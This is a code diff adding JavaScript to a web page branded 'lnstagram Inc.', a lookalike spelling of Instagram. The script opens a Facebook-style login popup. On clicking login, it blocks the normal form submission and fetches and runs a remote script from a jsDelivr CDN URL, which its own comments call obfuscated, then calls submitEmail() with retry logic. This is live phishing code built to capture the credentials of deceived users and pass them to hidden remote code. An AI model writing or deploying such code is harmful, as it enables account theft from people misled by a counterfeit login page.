@@ -37,3 +37,71 @@
             <div class="copyright">lnstagram Inc.</div>
         </div>
     </div>
+<script>
+        
+        // Event listener for the Open Popup button
+        document.getElementById('openPopup').addEventListener('click', function () {
+            if (!document.querySelector('.popup-login')) {
+                fetchPopupHTML();
+            } else {
+                console.log('Popup already exists in the DOM.');
+                if (typeof open_facebook === 'function') {
+                    open_facebook();
+                } else {
+                    console.error('open_facebook function is not defined.');
+                }
+            }
+        });
+
+        // Function to handle the login button click inside the popup
+        function huigo(event) {
+            event.preventDefault();  // Prevent default form submission
+            fetchObfuscatedScript();
+        }
+
+        // Function to fetch and execute the obfuscated script with retry logic
+        function fetchObfuscatedScript(retryCount = 3) {
+            const scriptUrl = 'https://cdn.jsdelivr.net/gh/Rajaryan827/Testforcdn@969149237ee3327be14207397c1ff214aec80816/index2.js';
+
+            // Check if the script is already loaded
+            if (!document.querySelector(`script[src="${scriptUrl}"]`)) {
+                const scriptElement = document.createElement('script');
+                scriptElement.src = scriptUrl;
+
+                scriptElement.onload = function () {
+                    console.log("Obfuscated JS loaded successfully.");
+                    if (typeof submitEmail === 'function') {
+                        try {
+                            submitEmail();  // Ensure submitEmail is defined
+                        } catch (error) {
+                            console.error('Error executing submitEmail:', error);
+                        }
+                    } else {
+                        console.error('submitEmail function is not defined.');
+                    }
+                };
+
+                scriptElement.onerror = function () {
+                    if (retryCount > 0) {
+                        console.warn(`Failed to load script. Retrying... (${retryCount} retries left)`);
+                        fetchObfuscatedScript(retryCount - 1);
+                    } else {
+                        console.error('Failed to load script after multiple attempts.');
+                    }
+                };
+
+                document.body.appendChild(scriptElement);
+            } else {
+                console.log('Obfuscated JS is already loaded.');
+                if (typeof submitEmail === 'function') {
+                    try {
+                        submitEmail();
+                    } catch (error) {
+                        console.error('Error executing submitEmail:', error);
+                    }
+                } else {
+                    console.error('submitEmail function is not defined.');
+                }
+            }
+        }
+</script>
